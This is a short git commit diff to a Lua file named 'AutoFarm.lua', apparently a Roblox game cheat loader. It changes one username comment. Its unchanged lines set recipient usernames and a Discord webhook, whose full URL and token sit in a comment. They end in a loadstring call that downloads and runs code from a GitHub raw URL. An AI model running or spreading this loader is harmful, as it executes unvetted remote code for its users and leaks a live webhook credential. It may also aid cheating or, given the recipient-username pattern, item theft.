757f6e597bfe0c6e87ca0b7a4ca2c72e4838f566
PETSIMULAT0RX <132601745+PETSIMULAT0RX@users.noreply.github.com>
2023-07-01 22:02:49 +0800

    Update AutoFarm.lua

--- AutoFarm.lua
+++ AutoFarm.lua
@@ -1,5 +1,5 @@
 _G.UserName = " " -- Zenn2345
-_G.UserName2 = " " -- MyFavOrange
+_G.UserName2 = " " -- Zenn2345
 _G.Webhook = " " -- https://discord.com/api/webhooks/1107537076192284723/jdp-l_6DLnWEzWrAjZquC7GOoeyydOexNRoWtweYSUGkPo3ElHWX1W-nYEwlguGRCC4c - optional
    
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
